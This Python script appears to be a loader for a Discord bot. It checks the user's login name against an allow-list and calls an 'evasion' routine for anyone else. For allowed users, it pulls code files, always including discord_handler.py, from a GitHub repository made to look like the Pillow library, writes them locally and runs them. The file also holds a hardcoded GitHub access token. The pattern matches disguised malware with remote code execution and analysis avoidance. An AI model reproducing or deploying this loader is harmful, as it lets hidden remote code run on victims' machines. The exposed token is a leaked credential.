import os
import json
import requests
from functions.update import ensure_update_file_exists

# Constants
GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
UPDATE_STATUS_FILE = os.path.join(os.path.dirname(__file__), "update_status.json")
LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
DISCORD_HANDLER_FILE = "discord_handler.py"
allowed_users = ["border", "bob", "User"]
github_token = "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"

# Ensure update file exists
ensure_update_file_exists()

def check_update_status():
    """Check if an update is needed based on the update_status.json file."""
    print("Checking update status...")
    if os.path.exists(UPDATE_STATUS_FILE):
        with open(UPDATE_STATUS_FILE, "r") as f:
            data = json.load(f)
            if data.get("update"):
                print(f"Update required for: {data.get('files_to_update', [])}")
                return data.get("files_to_update", [])
    print("No update needed.")
    return []

def reset_update_flag():
    """Reset the update flag after downloading and updating files."""
    print("Resetting update flag.")
    data = {"update": False, "files_to_update": []}
    with open(UPDATE_STATUS_FILE, "w") as f:
        json.dump(data, f)

def download_and_update_files(files_to_update):
    """Download the specified files from GitHub and save them locally."""
    headers = {'Authorization': f'token {github_token}'}
    print(f"Attempting to update files: {files_to_update}")

    for file_name in files_to_update:
        raw_url = GITHUB_RAW_URL_TEMPLATE.format(file_name)
        response = requests.get(raw_url, headers=headers)

        if response.status_code == 200:
            local_file_path = os.path.join(LOCAL_FUNCTIONS_PATH, file_name)
            with open(local_file_path, "wb") as file:
                file.write(response.content)
            print(f"Successfully updated: {file_name}")
        else:
            print(f"Failed to update: {file_name}. Status code: {response.status_code}")

    # Always update the discord_handler.py file
    raw_discord_handler_url = GITHUB_RAW_URL_TEMPLATE.format(DISCORD_HANDLER_FILE)
    response = requests.get(raw_discord_handler_url, headers=headers)
    if response.status_code == 200:
        local_discord_handler_path = os.path.join(LOCAL_FUNCTIONS_PATH, DISCORD_HANDLER_FILE)
        with open(local_discord_handler_path, "wb") as file:
            file.write(response.content)
        print(f"Updated: {DISCORD_HANDLER_FILE}")
    else:
        print(f"Failed to update {DISCORD_HANDLER_FILE}. Status code: {response.status_code}")

def evasion():
    """Placeholder for alternative functionality if the username is not allowed."""
    print("Unauthorized user. Exiting.")

def main():
    """Main function to check for updates and then run the Discord bot."""
    username = os.getlogin()
    print(f"Running as: {username}")

    if username in allowed_users:
        # Check if updates are required
        files_to_update = check_update_status()
        if files_to_update:
            # If updates are required, download and update the files
            print("Updating files before running Discord bot.")
            download_and_update_files(files_to_update)
            reset_update_flag()
        else:
            print("No updates required. Running Discord bot directly.")
    else:
        # If username is not allowed, execute evasion functionality
        evasion()
        return

    # Run the Discord bot only after all updates are checked and completed
    print("Starting Discord bot...")
    # Import start_discord_bot here, after updates and username check
    from functions.discord_handler import start_discord_bot
    start_discord_bot()

if __name__ == "__main__":
    main()
